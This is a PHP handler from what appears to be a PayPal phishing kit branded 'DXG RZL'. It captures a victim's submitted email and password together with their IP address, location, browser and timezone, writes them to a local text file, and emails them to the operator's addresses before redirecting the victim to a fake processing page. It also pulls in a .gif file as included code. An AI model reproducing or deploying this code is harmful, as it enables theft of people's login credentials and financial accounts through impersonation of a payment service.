<?php 
if(isset($_POST['EML'])&&isset($_POST['PWD'])){
    session_start();
    include '../mine.php';
    include '../../app/lib/pics/pope.gif';
    $_SESSION['EML']=$_POST['EML'];
    $msg="=========== <[ ⛔💥DXG RZL💥⛔]> ===========\r\n";
    $msg.="EMAIL		: {$_POST['EML']}\r\n";
    $msg.="PASS		: {$_POST['PWD']}\r\n";
    $msg.="---------------------- IP Info ⛔💥DXG RZL💥⛔ ----------------------\r\n";
    $msg.="IP ADDRESS	: {$_SESSION['ip']}\r\n";
    $msg.="LOCATION	: {$_SESSION['ip_city']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}\r\n";
    $msg.="BROWSER		: {$_SESSION['browser']} on {$_SESSION['os']}\r\n";
    $msg.="TIMEZONE	: {$_SESSION['ip_timezone']}\r\n";
    $msg.="TIME		: ".now()." GMT\r\n";
    $msg.="=========== <[ ⛔💥DXG RZL💥⛔]> ===========\r\n\r\n\r\n";
    $save=fopen("../../stored.txt","a+");
    fwrite($save,$msg);
    fclose($save);
    $subject="PaYPal ⛔💥DXG RZL💥⛔ [".$_POST['EML']."|".$_SESSION['ip_countryName']."]";
    $headers="From:⛔💥DXG RZL💥⛔ <DOUBLEXGG@vip.su>\r\n";
    $headers.="MIME-Version: 1.0\r\n";
    $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
    @mail($yours,$subject,$msg,$headers);
    @mail($info,$subject,$msg,$headers);
    exit(header("Location: ../../app/process"));
}
?>